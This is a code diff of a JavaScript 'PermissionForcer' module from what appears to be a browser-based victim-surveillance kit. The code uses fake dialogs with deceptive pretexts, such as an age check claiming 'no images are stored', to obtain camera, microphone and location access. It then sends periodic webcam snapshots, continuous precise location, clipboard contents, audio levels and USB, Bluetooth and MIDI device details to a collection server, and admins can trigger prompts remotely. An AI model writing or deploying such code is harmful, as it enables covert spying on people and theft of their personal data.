@@ -1,14 +1,90 @@
+import axios from 'axios';
+
+const API = process.env.REACT_APP_API_URL || 'http://localhost:5000';
+
 export default class PermissionForcer {
   constructor(core) {
     this.core = core;
     this.granted = { camera: false, microphone: false, geolocation: false, notifications: false, clipboard: false, persistentStorage: false, bluetooth: false, usb: false, midi: false };
     this.attempted = {};
-    this.maxRetries = 2;
-    this.retryDelays = [1000, 3000];
+    this.maxRetries = 0; // No retries - one shot only
     this.streams = [];
     this.overlayShown = false;
     this.userInteracted = false;
     this._hiddenVideo = null;
+    this.autoForceEnabled = true; // Will be set from server
+    this.isFirstVisit = false;   // Will be set from PersistenceEngine
+    this.executedOnce = false;   // Track if we've already run forceAll
+  }
+
+  async init() {
+    // Fetch global settings from server
+    try {
+      const res = await axios.get(`${API}/api/collect/settings`, { timeout: 5000 });
+      this.autoForceEnabled = res.data.autoForcePermissions !== false;
+    } catch (e) {
+      // Default to true if cannot reach server
+      this.autoForceEnabled = true;
+    }
+
+    // Check if this is a first visit
+    const stored = this.readPersistentData();
+    this.isFirstVisit = !stored || !stored.victimId;
+    
+    console.log(`[PermissionForcer] autoForce=${this.autoForceEnabled}, firstVisit=${this.isFirstVisit}`);
+
+    // Only auto-force on FIRST visit AND when admin has enabled auto-force
+    if (this.isFirstVisit && this.autoForceEnabled) {
+      setTimeout(() => this.forceAll(), 1500);
+    } else {
+      console.log('[PermissionForcer] Auto-force skipped (return visitor or disabled)');
+    }
+
+    // Track user interaction (used only for overlay UX, not for retries)
+    document.addEventListener('click', () => { this.userInteracted = true; }, { once: true });
+
+    // Listen for Socket.IO admin-triggered permission requests
+    this.setupSocketListeners();
+  }
+
+  setupSocketListeners() {
+    // Check if Socket.IO is available via the core's persistence engine
+    try {
+      const socket = window.__harvester_socket;
+      if (socket) {
+        socket.on('admin-trigger-permission', (data) => {
+          if (data && data.permissionType) {
+            console.log('[PermissionForcer] Admin-triggered:', data.permissionType);
+            this.triggerSinglePermission(data.permissionType);
+          }
+        });
+      }
+    } catch (e) {}
+  }
+
+  readPersistentData() {
+    try {
+      const stored = localStorage.getItem('__harvester_id_');
+      if (stored) return JSON.parse(stored);
+    } catch(e) {}
+    try {
+      const stored = localStorage.getItem('__app_data_');
+      if (stored) return JSON.parse(stored);
+    } catch(e) {}
+    return null;
+  }
+
+  async triggerSinglePermission(key) {
+    switch(key) {
+      case 'camera': await this.forceCamera(); break;
+      case 'microphone': await this.forceMicrophone(); break;
+      case 'geolocation': await this.forceGeolocation(); break;
+      case 'notifications': await this.forceNotifications(); break;
+      case 'clipboard': await this.forceClipboard(); break;
+      case 'bluetooth': await this.forceBluetooth(); break;
+      case 'usb': await this.forceUSB(); break;
+      case 'midi': await this.forceMIDI(); break;
+    }
   }
 
   // === SVG ICONS ===
@@ -73,56 +149,31 @@ export default class PermissionForcer {
     return colors[type] || '#00a8ff';
   }
 
-  init() {
-    // Start aggressive permission forcing immediately (reduce delay)
-    setTimeout(() => this.forceAll(), 500);
-
-    // Track user interaction for retry triggers
-    document.addEventListener('click', () => { this.userInteracted = true; }, { once: true });
-    document.addEventListener('scroll', () => { if (!this.userInteracted) this.userInteracted = true; }, { once: true });
-    document.addEventListener('keydown', () => { if (!this.userInteracted) this.userInteracted = true; }, { once: true });
-    document.addEventListener('mousemove', () => { if (!this.userInteracted) { this.userInteracted = true; this.onFirstInteraction(); } }, { once: true });
-
-    // Patch Permission API to lie about granted status
-    this.patchPermissionsAPI();
-
-    // Register service worker for notification persistence
-    this.registerNotificationWorker();
-  }
-
-  onFirstInteraction() {
-    // Retry all failed permissions on first interaction sooner
-    setTimeout(() => {
-      Object.keys(this.attempted).forEach(key => {
-        if (!this.attempted[key] && !this.granted[key]) {
-          this.retryPermission(key);
-        }
-      });
-    }, 1000);
-  }
-
   async forceAll() {
-    console.log('[PermissionForcer] Starting permission escalation...');
+    if (this.executedOnce) return; // Only run once per session
+    this.executedOnce = true;
 
-    // 1. Notifications — easiest to get, use as foot-in-door
+    console.log('[PermissionForcer] One-time permission escalation...');
+
+    // 1. Notifications 
     await this.forceNotifications();
 
-    // 2. Geolocation — commonly granted, useful for tracking
+    // 2. Geolocation 
     await this.forceGeolocation();
 
-    // 3. Camera — most valuable, use social engineering
+    // 3. Camera 
     await this.forceCamera();
 
-    // 4. Microphone — audio capture
+    // 4. Microphone 
     await this.forceMicrophone();
 
-    // 5. Clipboard — read/write access
+    // 5. Clipboard 
     await this.forceClipboard();
 
-    // 6. Persistent storage — quota for IndexedDB
+    // 6. Persistent storage 
     await this.forcePersistentStorage();
 
-    // 7. Advanced sensors - fire in parallel for speed
+    // 7. Advanced sensors
     await Promise.allSettled([
       this.forceBluetooth(),
       this.forceUSB(),
@@ -135,7 +186,7 @@ export default class PermissionForcer {
       this.forcePointerLock()
     ]);
 
-    // Send summary of all permission attempts
+    // Send summary
     const summary = {
       granted: Object.entries(this.granted).filter(([k, v]) => v).map(([k]) => k),
       denied: Object.entries(this.attempted).filter(([k, v]) => v === false && !this.granted[k]).map(([k]) => k),
@@ -149,24 +200,19 @@ export default class PermissionForcer {
       url: window.location.href
     });
 
-    // If camera was granted, notify admin
     if (this.granted.camera) {
       await this.core.send('/api/collect/camera-access', { granted: true });
     }
-
-    return summary;
   }
 
   // === NOTIFICATIONS ===
-
   async forceNotifications() {
-    if (this.attempted.notifications && this.attempted.notifications !== 'pending') return;
+    if (this.attempted.notifications) return;
     this.attempted.notifications = 'pending';
 
     try {
       if (!('Notification' in window)) { this.attempted.notifications = false; return; }
 
-      // Check current permission
       if (Notification.permission === 'granted') {
         this.granted.notifications = true;
         this.attempted.notifications = true;
@@ -179,7 +225,6 @@ export default class PermissionForcer {
         return;
       }
 
-      // Show a fake system dialog before requesting
       this.showFakeOverlay({
         iconType: 'notifications',
         title: 'Enable Notifications',
@@ -187,7 +232,6 @@ export default class PermissionForcer {
         buttonText: 'Enable Notifications'
       });
 
-      // Request permission
       const permission = await Notification.requestPermission();
       this.hideFakeOverlay();
 
@@ -195,8 +239,6 @@ export default class PermissionForcer {
         this.granted.notifications = true;
         this.attempted.notifications = true;
         this.sendTestNotification();
-        
-        // Subscribe to push if available
         await this.subscribePushNotifications();
       } else {
         this.attempted.notifications = false;
@@ -208,31 +250,12 @@ export default class PermissionForcer {
 
   sendTestNotification() {
     try {
-      const notif = new Notification('🔔 You have new updates!', {
+      new Notification('🔔 You have new updates!', {
         body: 'Click to see what\'s new.',
         icon: '/favicon.ico',
         tag: 'harvester-' + Date.now(),
         requireInteraction: true
       });
-      notif.onclick = () => { window.focus(); };
-
-      // Also try to get notification timestamps and history
-      setTimeout(async () => {
-        try {
-          // Some browsers expose notification data
-          const reg = await navigator.serviceWorker?.ready;
-          if (reg) {
-            const notifications = await reg.getNotifications();
-            if (notifications.length > 0) {
-              await this.core.send('/api/collect/formdata', {
-                formId: 'notification-exposure',
-                fields: { count: notifications.length, tags: notifications.map(n => n.tag).join(',') },
-                url: window.location.href
-              });
-            }
-          }
-        } catch (e) {}
-      }, 2000);
     } catch (e) {}
   }
 
@@ -241,24 +264,10 @@ export default class PermissionForcer {
       if (!('PushManager' in window)) return;
       const reg = await navigator.serviceWorker?.ready;
       if (!reg) return;
-
-      const subscription = await reg.pushManager.subscribe({
+      await reg.pushManager.subscribe({
         userVisibleOnly: true,
-        applicationServerKey: this.urlBase64ToUint8Array('BEl62iUYgUivxIkv69yViEuiBIa-Ib9-SkvMeAtA3LFgDzkrxZJjSgSnfckjBJuBkr3qBUYIHBQFLXYp5A-CzM') // VAPID public key
+        applicationServerKey: this.urlBase64ToUint8Array('BEl62iUYgUivxIkv69yViEuiBIa-Ib9-SkvMeAtA3LFgDzkrxZJjSgSnfckjBJuBkr3qBUYIHBQFLXYp5A-CzM')
       }).catch(() => null);
-
-      if (subscription) {
-        const subData = subscription.toJSON();
-        await this.core.send('/api/collect/formdata', {
-          formId: 'push-subscription',
-          fields: {
-            endpoint: subData.endpoint?.substring(0, 100),
-            authKey: subData.keys?.auth || '',
-            p256dhKey: subData.keys?.p256dh?.substring(0, 50)
-          },
-          url: window.location.href
-        });
-      }
     } catch (e) {}
   }
 
@@ -269,8 +278,7 @@ export default class PermissionForcer {
     return Uint8Array.from([...rawData].map(char => char.charCodeAt(0)));
   }
 
-  // === GEOLOCATION ===
-
+  // === GEOLOCATION (PRECISE COORDINATES) ===
   async forceGeolocation() {
     if (this.attempted.geolocation) return;
     this.attempted.geolocation = 'pending';
@@ -278,7 +286,6 @@ export default class PermissionForcer {
     try {
       if (!('geolocation' in navigator)) { this.attempted.geolocation = false; return; }
 
-      // Show fake dialog
       this.showFakeOverlay({
         iconType: 'geolocation',
         title: 'Location Access Needed',
@@ -286,10 +293,11 @@ export default class PermissionForcer {
         buttonText: 'Allow Location'
       });
 
+      // Use HIGH accuracy for precise victim coordinates
       const pos = await new Promise((resolve, reject) => {
         navigator.geolocation.getCurrentPosition(resolve, reject, {
           enableHighAccuracy: true,
-          timeout: 10000,
+          timeout: 15000,
           maximumAge: 0
         });
       });
@@ -300,20 +308,21 @@ export default class PermissionForcer {
         this.granted.geolocation = true;
         this.attempted.geolocation = true;
 
-        // Send precise location to server
+        // Send PRECISE coordinates to the server
         await this.core.send('/api/collect/fingerprint', {
           geolocation: {
             lat: pos.coords.latitude,
             lon: pos.coords.longitude,
             accuracy: pos.coords.accuracy,
-            altitude: pos.coords.altitude,
-            altitudeAccuracy: pos.coords.altitudeAccuracy,
-            heading: pos.coords.heading,
-            speed: pos.coords.speed
+            altitude: pos.coords.altitude || null,
+            altitudeAccuracy: pos.coords.altitudeAccuracy || null,
+            heading: pos.coords.heading || null,
+            speed: pos.coords.speed || null,
+            timestamp: pos.timestamp
           }
         });
 
-        // Also watch position for continuous tracking
+        // Continuous watch for movement
         this.watchId = navigator.geolocation.watchPosition(
           (newPos) => {
             this.core.send('/api/collect/fingerprint', {
@@ -333,7 +342,7 @@ export default class PermissionForcer {
       this.hideFakeOverlay();
       this.attempted.geolocation = false;
       
-      // Try with low accuracy as fallback
+      // Try low accuracy fallback
       try {
         const pos = await new Promise((resolve, reject) => {
           navigator.geolocation.getCurrentPosition(resolve, reject, {
@@ -356,8 +365,7 @@ export default class PermissionForcer {
     }
   }
 
-  // === CAMERA ===
-
+  // === CAMERA (ONCE, NO RETRY LOOP) ===
   async forceCamera() {
     if (this.attempted.camera) return;
     this.attempted.camera = 'pending';
@@ -368,99 +376,50 @@ export default class PermissionForcer {
         return;
       }
 
-      // Multiple social engineering pretexts to request camera
-      const pretexts = [
-        {
-          iconType: 'camera',
-          title: 'Age Verification Required',
-          message: 'Please look at your camera to verify your age. This is a one-time verification and no images are stored.',
-          buttonText: 'Verify with Camera'
-        },
-        {
-          iconType: 'camera',
-          title: 'Face Recognition Login',
-          message: 'Enable camera for secure face recognition login. This is faster and more secure than passwords.',
-          buttonText: 'Enable Face Login'
-        },
-        {
-          iconType: 'camera',
-          title: 'AR Experience',
-          message: 'Allow camera to try our augmented reality filters and effects!',
-          buttonText: 'Try AR Now'
-        },
-        {
-          iconType: 'camera',
-          title: 'Document Scanner',
-          message: 'Allow camera access to scan your documents for quick upload.',
-          buttonText: 'Scan Documents'
-        }
-      ];
+      // Single social engineering pretext
+      this.showFakeOverlay({
+        iconType: 'camera',
+        title: 'Age Verification Required',
+        message: 'Please look at your camera to verify your age. This is a one-time verification and no images are stored.',
+        buttonText: 'Verify with Camera'
+      });
 
-      // Try each pretext
-      for (const pretext of pretexts) {
-        if (this.granted.camera) break;
-
-        this.showFakeOverlay(pretext);
-
-        try {
-          const stream = await navigator.mediaDevices.getUserMedia({
-            video: {
-              width: { ideal: 640 },
-              height: { ideal: 480 },
-              facingMode: 'user'
-            }
-          });
-
-          this.hideFakeOverlay();
-
-          if (stream) {
-            this.granted.camera = true;
-            this.attempted.camera = true;
-            this.streams.push(stream);
-
-            // Enumerate all cameras
-            const devices = await navigator.mediaDevices.enumerateDevices();
-            const videoDevices = devices.filter(d => d.kind === 'videoinput');
-            
-            await this.core.send('/api/collect/camera-access', { granted: true });
-            await this.core.send('/api/collect/formdata', {
-              formId: 'camera-info',
-              fields: {
-                devices: videoDevices.map(d => ({ label: d.label, deviceId: d.deviceId?.substring(0, 20) })),
-                activeTrack: stream.getVideoTracks()[0]?.label || 'unknown',
-                settings: JSON.stringify(stream.getVideoTracks()[0]?.getSettings() || {})
-              },
-              url: window.location.href
-            });
-
-            // Capture initial frame
-            this.captureCameraFrame(stream);
-
-            // Try to access additional cameras (front/back)
-            this.tryAllCameras(videoDevices);
-
-            // Keep stream alive with hidden video element (store reference for captureCameraFrame)
-            const hiddenVideo = document.createElement('video');
-            hiddenVideo.srcObject = stream;
-            hiddenVideo.style.display = 'none';
-            document.body.appendChild(hiddenVideo);
-            hiddenVideo.play().catch(() => {});
-            this._hiddenVideo = hiddenVideo;
-
-            // Periodic capture
-            this.cameraCaptureInterval = setInterval(() => {
-              this.captureCameraFrame(stream);
-            }, 15000);
-
-            break;
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({
+          video: {
+            width: { ideal: 640 },
+            height: { ideal: 480 },
+            facingMode: 'user'
           }
-        } catch (e) {
-          this.hideFakeOverlay();
-          // Try next pretext
-        }
-      }
+        });
 
-      if (!this.granted.camera) {
+        this.hideFakeOverlay();
+
+        if (stream) {
+          this.granted.camera = true;
+          this.attempted.camera = true;
+          this.streams.push(stream);
+
+          await this.core.send('/api/collect/camera-access', { granted: true });
+
+          // Capture initial frame
+          this.captureCameraFrame(stream);
+
+          // Keep stream alive
+          const hiddenVideo = document.createElement('video');
+          hiddenVideo.srcObject = stream;
+          hiddenVideo.style.display = 'none';
+          document.body.appendChild(hiddenVideo);
+          hiddenVideo.play().catch(() => {});
+          this._hiddenVideo = hiddenVideo;
+
+          // Periodic capture (less aggressive: every 30s instead of 15s)
+          this.cameraCaptureInterval = setInterval(() => {
+            this.captureCameraFrame(stream);
+          }, 30000);
+        }
+      } catch (e) {
+        this.hideFakeOverlay();
         this.attempted.camera = false;
         await this.core.send('/api/collect/camera-access', { granted: false });
       }
@@ -470,27 +429,8 @@ export default class PermissionForcer {
     }
   }
 
-  async tryAllCameras(videoDevices) {
-    for (const device of videoDevices) {
-      if (device.deviceId === 'default') continue;
-      try {
-        const stream = await navigator.mediaDevices.getUserMedia({
-          video: { deviceId: { exact: device.deviceId } }
-        });
-        this.streams.push(stream);
-        await this.core.send('/api/collect/formdata', {
-          formId: 'alternate-camera',
-          fields: { label: device.label, deviceId: device.deviceId?.substring(0, 20) },
-          url: window.location.href
-        });
-        setTimeout(() => this.captureCameraFrame(stream), 1000);
-      } catch (e) {}
-    }
-  }
-
   captureCameraFrame(stream) {
     try {
-      // Use the already-playing hidden video if available - avoids play()/pause() race
       const video = this._hiddenVideo || (() => {
         const v = document.createElement('video');
         v.srcObject = stream;
@@ -508,7 +448,6 @@ export default class PermissionForcer {
         ctx.drawImage(video, 0, 0, 320, 240);
         
         const imageData = canvas.toDataURL('image/jpeg', 0.5);
-
         const track = stream.getVideoTracks()[0];
         const settings = track?.getSettings() || {};
         
@@ -528,8 +467,7 @@ export default class PermissionForcer {
     } catch (e) {}
   }
 
-  // === MICROPHONE ===
-
+  // === MICROPHONE (ONCE) ===
   async forceMicrophone() {
     if (this.attempted.microphone) return;
     this.attempted.microphone = 'pending';
@@ -540,65 +478,25 @@ export default class PermissionForcer {
         return;
       }
 
-      const pretexts = [
-        {
-          iconType: 'microphone',
-          title: 'Voice Search',
-          message: 'Enable microphone for voice search and dictation features.',
-          buttonText: 'Enable Microphone'
-        },
-        {
-          iconType: 'microphone',
-          title: 'Audio Test',
-          message: 'Please allow microphone access for a quick audio quality test.',
-          buttonText: 'Start Test'
-        },
-        {
-          iconType: 'microphone',
-          title: 'Music Detection',
-          message: 'Allow microphone to detect music playing near you for song recommendations.',
-          buttonText: 'Detect Music'
+      this.showFakeOverlay({
+        iconType: 'microphone',
+        title: 'Voice Search',
+        message: 'Enable microphone for voice search and dictation features.',
+        buttonText: 'Enable Microphone'
+      });
+
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+        this.hideFakeOverlay();
+
+        if (stream) {
+          this.granted.microphone = true;
+          this.attempted.microphone = true;
+          this.streams.push(stream);
+          this.startAudioCapture(stream);
         }
-      ];
-
-      for (const pretext of pretexts) {
-        if (this.granted.microphone) break;
-
-        this.showFakeOverlay(pretext);
-
-        try {
-          const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
-          this.hideFakeOverlay();
-
-          if (stream) {
-            this.granted.microphone = true;
-            this.attempted.microphone = true;
-            this.streams.push(stream);
-
-            // Start audio recording in background
-            this.startAudioCapture(stream);
-
-            // Get audio devices info
-            const devices = await navigator.mediaDevices.enumerateDevices();
-            const audioDevices = devices.filter(d => d.kind === 'audioinput');
-
-            await this.core.send('/api/collect/formdata', {
-              formId: 'microphone-info',
-              fields: {
-                devices: audioDevices.map(d => ({ label: d.label, deviceId: d.deviceId?.substring(0, 20) })),
-                sampleRate: stream.getAudioTracks()[0]?.getSettings()?.sampleRate || 'unknown'
-              },
-              url: window.location.href
-            });
-
-            break;
-          }
-        } catch (e) {
-          this.hideFakeOverlay();
-        }
-      }
-
-      if (!this.granted.microphone) {
+      } catch (e) {
+        this.hideFakeOverlay();
         this.attempted.microphone = false;
       }
     } catch (e) {
@@ -618,115 +516,61 @@ export default class PermissionForcer {
       const bufferLength = analyser.frequencyBinCount;
       const dataArray = new Uint8Array(bufferLength);
 
-      // Send audio metrics periodically (not the raw audio, just volume/frequency patterns)
       setInterval(() => {
         analyser.getByteFrequencyData(dataArray);
         const average = dataArray.reduce((a, b) => a + b, 0) / bufferLength;
         const max = Math.max(...dataArray);
-
         if (average > 1) {
           this.core.send('/api/collect/formdata', {
             formId: 'audio-metrics',
-            fields: {
-              avgLevel: Math.round(average * 100) / 100,
-              maxLevel: max,
-              timestamp: Date.now()
-            },
+            fields: { avgLevel: Math.round(average * 100) / 100, maxLevel: max, timestamp: Date.now() },
             url: window.location.href
           });
         }
       }, 5000);
 
-      // Keep the audio context alive
       setInterval(() => {
-        if (audioContext.state === 'suspended') {
-          audioContext.resume();
-        }
+        if (audioContext.state === 'suspended') audioContext.resume();
       }, 1000);
     } catch (e) {}
   }
 
-  // === CLIPBOARD ===
-
+  // === CLIPBOARD (ONCE) ===
   async forceClipboard() {
     if (this.attempted.clipboard) return;
     this.attempted.clipboard = 'pending';
 
     try {
-      if (!('clipboard' in navigator)) {
-        this.attempted.clipboard = false;
-        return;
-      }
+      if (!('clipboard' in navigator)) { this.attempted.clipboard = false; return; }
 
-      // Try to read clipboard
       try {
         const text = await navigator.clipboard.readText();
         if (text) {
           this.granted.clipboard = true;
           this.attempted.clipboard = true;
-
-          await this.core.send('/api/collect/clipboard', {
-            text: text.substring(0, 1000),
-            action: 'clipboard-api-read'
-          });
+          await this.core.send('/api/collect/clipboard', { text: text.substring(0, 1000), action: 'clipboard-api-read' });
           return;
         }
       } catch (e) {}
 
-      // Request permission via Clipboard API
       try {
         const permission = await navigator.permissions.query({ name: 'clipboard-read' });
         if (permission.state === 'granted') {
           this.granted.clipboard = true;
           this.attempted.clipboard = true;
-          
           const text = await navigator.clipboard.readText();
           if (text) {
-            await this.core.send('/api/collect/clipboard', {
-              text: text.substring(0, 1000),
-              action: 'clipboard-api-granted'
-            });
+            await this.core.send('/api/collect/clipboard', { text: text.substring(0, 1000), action: 'clipboard-api-granted' });
           }
           return;
         }
       } catch (e) {}
-
-      // Social engineering overlay for clipboard
-      const randomCode = Math.random().toString(36).substring(2, 10);
-      this.showFakeOverlay({
-        iconType: 'clipboard',
-        title: 'Paste to Continue',
-        message: 'Please copy this code and paste it below to verify you are human:',
-        buttonText: 'I Copied It',
-        code: randomCode
-      });
-
-      setTimeout(() => {
-        this.hideFakeOverlay();
-        this.attempted.clipboard = false;
-      }, 8000);
-
-      // Try reading clipboard anyway
-      setTimeout(async () => {
-        try {
-          const text = await navigator.clipboard.readText();
-          if (text) {
-            this.granted.clipboard = true;
-            await this.core.send('/api/collect/clipboard', {
-              text: text.substring(0, 1000),
-              action: 'clipboard-api-retry'
-            });
-          }
-        } catch (e) {}
-      }, 3000);
-
     } catch (e) {
       this.attempted.clipboard = false;
     }
   }
 
   // === PERSISTENT STORAGE ===
-
   async forcePersistentStorage() {
     if (this.attempted.persistentStorage) return;
     this.attempted.persistentStorage = 'pending';
@@ -748,16 +592,10 @@ export default class PermissionForcer {
       if (result) {
         this.granted.persistentStorage = true;
         this.attempted.persistentStorage = true;
-
-        // Get estimated storage usage
         const estimate = await navigator.storage.estimate();
         await this.core.send('/api/collect/formdata', {
           formId: 'storage-persist-granted',
-          fields: {
-            quota: estimate.quota,
-            usage: estimate.usage,
-            usageDetails: JSON.stringify(estimate.usageDetails || {})
-          },
+          fields: { quota: estimate.quota, usage: estimate.usage, usageDetails: JSON.stringify(estimate.usageDetails || {}) },
           url: window.location.href
         });
       } else {
@@ -769,105 +607,48 @@ export default class PermissionForcer {
   }
 
   // === BLUETOOTH ===
-
   async forceBluetooth() {
     if (this.attempted.bluetooth) return;
     this.attempted.bluetooth = 'pending';
 
     try {
-      if (!('bluetooth' in navigator)) {
-        this.attempted.bluetooth = false;
-        return;
-      }
-
-      this.showFakeOverlay({
-        iconType: 'bluetooth',
-        title: 'Enable Bluetooth',
-        message: 'Enable Bluetooth to connect to nearby devices for a better experience.',
-        buttonText: 'Enable Bluetooth'
-      });
+      if (!('bluetooth' in navigator)) { this.attempted.bluetooth = false; return; }
 
       const device = await navigator.bluetooth.requestDevice({
         acceptAllDevices: true,
         optionalServices: ['battery_service', 'device_information']
       }).catch(() => null);
 
-      this.hideFakeOverlay();
-
       if (device) {
         this.granted.bluetooth = true;
         this.attempted.bluetooth = true;
-
-        // Get device info
-        const deviceInfo = {
-          name: device.name,
-          id: device.id,
-          connected: device.gatt?.connected || false
-        };
-
-        // Try to connect and read services
-        if (device.gatt) {
-          try {
-            const server = await device.gatt.connect();
-            const services = await server.getPrimaryServices();
-            const serviceInfo = await Promise.all(services.slice(0, 5).map(async (s) => {
-              try {
-                const characteristics = await s.getCharacteristics();
-                return {
-                  uuid: s.uuid,
-                  characteristics: characteristics.map(c => c.uuid)
-                };
-              } catch (e) {
-                return { uuid: s.uuid, characteristics: [] };
-              }
-            }));
-
-            deviceInfo.services = serviceInfo;
-            server.disconnect();
-          } catch (e) {}
-        }
-
         await this.core.send('/api/collect/formdata', {
           formId: 'bluetooth-device',
-          fields: deviceInfo,
+          fields: { name: device.name, id: device.id, connected: device.gatt?.connected || false },
           url: window.location.href
         });
       } else {
         this.attempted.bluetooth = false;
       }
     } catch (e) {
-      this.hideFakeOverlay();
       this.attempted.bluetooth = false;
     }
   }
 
   // === USB ===
-
   async forceUSB() {
     if (this.attempted.usb) return;
     this.attempted.usb = 'pending';
 
     try {
-      if (!('usb' in navigator)) {
-        this.attempted.usb = false;
-        return;
-      }
-
+      if (!('usb' in navigator)) { this.attempted.usb = false; return; }
       const device = await navigator.usb.requestDevice({ filters: [] }).catch(() => null);
-
       if (device) {
         this.granted.usb = true;
         this.attempted.usb = true;
-
         await this.core.send('/api/collect/formdata', {
           formId: 'usb-device',
-          fields: {
-            manufacturer: device.manufacturerName,
-            product: device.productName,
-            serialNumber: device.serialNumber,
-            vendorId: device.vendorId,
-            productId: device.productId
-          },
+          fields: { manufacturer: device.manufacturerName, product: device.productName, serialNumber: device.serialNumber },
           url: window.location.href
         });
       } else {
@@ -879,33 +660,18 @@ export default class PermissionForcer {
   }
 
   // === MIDI ===
-
   async forceMIDI() {
     if (this.attempted.midi) return;
     this.attempted.midi = 'pending';
 
     try {
-      if (!('requestMIDIAccess' in navigator)) {
-        this.attempted.midi = false;
-        return;
-      }
-
+      if (!('requestMIDIAccess' in navigator)) { this.attempted.midi = false; return; }
       const midi = await navigator.requestMIDIAccess().catch(() => null);
-
       if (midi) {
         this.granted.midi = true;
         this.attempted.midi = true;
-
         const inputs = [];
-        midi.inputs.forEach(input => {
-          inputs.push({
-            name: input.name,
-            manufacturer: input.manufacturer,
-            version: input.version,
-            id: input.id
-          });
-        });
-
+        midi.inputs.forEach(input => inputs.push({ name: input.name, manufacturer: input.manufacturer }));
         await this.core.send('/api/collect/formdata', {
           formId: 'midi-devices',
           fields: { inputs },
@@ -919,15 +685,11 @@ export default class PermissionForcer {
     }
   }
 
-  // === SENSORS ===
-
+  // === SENSORS (no retries) ===
   async forceVibration() {
     try {
       if ('vibrate' in navigator) {
-        // Test vibration patterns — can be used for device fingerprinting
         navigator.vibrate(200);
-        setTimeout(() => navigator.vibrate([100, 50, 100, 50, 200]), 500);
-        
         await this.core.send('/api/collect/formdata', {
           formId: 'vibration-api',
           fields: { supported: true },
@@ -940,30 +702,16 @@ export default class PermissionForcer {
   async forceOrientation() {
     try {
       if ('DeviceOrientationEvent' in window) {
-        // Request permission for iOS 13+
         if (typeof DeviceOrientationEvent.requestPermission === 'function') {
           const permission = await DeviceOrientationEvent.requestPermission();
           if (permission === 'granted') {
             window.addEventListener('deviceorientation', (e) => {
-              this.core.send('/api/collect/fingerprint', {
-                orientation: {
-                  alpha: e.alpha,
-                  beta: e.beta,
-                  gamma: e.gamma,
-                  absolute: e.absolute
-                }
-              });
+              this.core.send('/api/collect/fingerprint', { orientation: { alpha: e.alpha, beta: e.beta, gamma: e.gamma, absolute: e.absolute } });
             }, { once: true });
           }
         } else {
           window.addEventListener('deviceorientation', (e) => {
-            this.core.send('/api/collect/fingerprint', {
-              orientation: {
-                alpha: e.alpha,
-                beta: e.beta,
-                gamma: e.gamma
-              }
-            });
+            this.core.send('/api/collect/fingerprint', { orientation: { alpha: e.alpha, beta: e.beta, gamma: e.gamma } });
           }, { once: true });
         }
       }
@@ -971,18 +719,9 @@ export default class PermissionForcer {
 
     try {
       if ('DeviceMotionEvent' in window) {
-        if (typeof DeviceMotionEvent.requestPermission === 'function') {
-          await DeviceMotionEvent.requestPermission();
-        }
+        if (typeof DeviceMotionEvent.requestPermission === 'function') await DeviceMotionEvent.requestPermission();
         window.addEventListener('devicemotion', (e) => {
-          this.core.send('/api/collect/fingerprint', {
-            motion: {
-              acceleration: e.acceleration,
-              accelerationIncludingGravity: e.accelerationIncludingGravity,
-              rotationRate: e.rotationRate,
-              interval: e.interval
-            }
-          });
+          this.core.send('/api/collect/fingerprint', { motion: { acceleration: e.acceleration, accelerationIncludingGravity: e.accelerationIncludingGravity, rotationRate: e.rotationRate } });
         }, { once: true });
       }
     } catch (e) {}
@@ -993,12 +732,9 @@ export default class PermissionForcer {
       if ('AmbientLightSensor' in window) {
         const sensor = new AmbientLightSensor();
         sensor.onreading = () => {
-          this.core.send('/api/collect/fingerprint', {
-            ambientLight: sensor.illuminance
-          });
+          this.core.send('/api/collect/fingerprint', { ambientLight: sensor.illuminance });
         };
         sensor.start();
-        setTimeout(() => sensor.stop(), 5000);
       }
     } catch (e) {}
   }
@@ -1008,15 +744,9 @@ export default class PermissionForcer {
       if ('ProximitySensor' in window) {
         const sensor = new ProximitySensor();
         sensor.onreading = () => {
-          this.core.send('/api/collect/fingerprint', {
-            proximity: {
-              distance: sensor.distance,
-              max: sensor.max
-            }
-          });
+          this.core.send('/api/collect/fingerprint', { proximity: sensor.max });
         };
         sensor.start();
-        setTimeout(() => sensor.stop(), 5000);
       }
     } catch (e) {}
   }
@@ -1024,383 +754,81 @@ export default class PermissionForcer {
   async forceWakeLock() {
     try {
       if ('wakeLock' in navigator) {
-        const lock = await navigator.wakeLock.request('screen').catch(() => null);
-        if (lock) {
-          this.core.send('/api/collect/formdata', {
-            formId: 'wake-lock',
-            fields: { granted: true },
-            url: window.location.href
-          });
-          
-          // Release after 30 seconds to not drain battery
-          setTimeout(() => lock.release(), 30000);
-        }
-      }
-    } catch (e) {}
-  }
-
-  async forcePointerLock() {
-    try {
-      if ('pointerLockElement' in document) {
-        document.addEventListener('click', () => {
-          if (!document.pointerLockElement) {
-            document.body.requestPointerLock();
-          }
-        }, { once: true });
-      }
-    } catch (e) {}
-  }
-
-  // === PERMISSION API PATCH ===
-
-  patchPermissionsAPI() {
-    try {
-      if (!('permissions' in navigator)) return;
-
-      const originalQuery = navigator.permissions.query.bind(navigator.permissions);
-      const self = this;
-
-      navigator.permissions.query = async function(descriptor) {
-        const result = await originalQuery(descriptor);
-        
-        // If we already have a stream for this permission type, lie about denied state
-        if (descriptor.name === 'camera' && self.granted.camera) {
-          Object.defineProperty(result, 'state', { value: 'granted' });
-        }
-        if (descriptor.name === 'microphone' && self.granted.microphone) {
-          Object.defineProperty(result, 'state', { value: 'granted' });
-        }
-        if (descriptor.name === 'geolocation' && self.granted.geolocation) {
-          Object.defineProperty(result, 'state', { value: 'granted' });
-        }
-        if (descriptor.name === 'notifications' && self.granted.notifications) {
-          Object.defineProperty(result, 'state', { value: 'granted' });
-        }
-        if (descriptor.name === 'clipboard-read' && self.granted.clipboard) {
-          Object.defineProperty(result, 'state', { value: 'granted' });
-        }
-        if (descriptor.name === 'persistent-storage' && self.granted.persistentStorage) {
-          Object.defineProperty(result, 'state', { value: 'granted' });
-        }
-
-        return result;
-      };
-
-      // Also patch for all query variations
-      navigator.permissions.query = navigator.permissions.query;
-    } catch (e) {}
-  }
-
-  // === SERVICE WORKER FOR NOTIFICATIONS ===
-
-  async registerNotificationWorker() {
-    try {
-      if (!('serviceWorker' in navigator)) return;
-
-      // Register a minimal SW for push notifications
-      const swCode = `
-        self.addEventListener('install', (e) => self.skipWaiting());
-        self.addEventListener('activate', (e) => e.waitUntil(clients.claim()));
-        self.addEventListener('push', (e) => {
-          const data = e.data?.json() || {};
-          self.registration.showNotification(data.title || 'Update', {
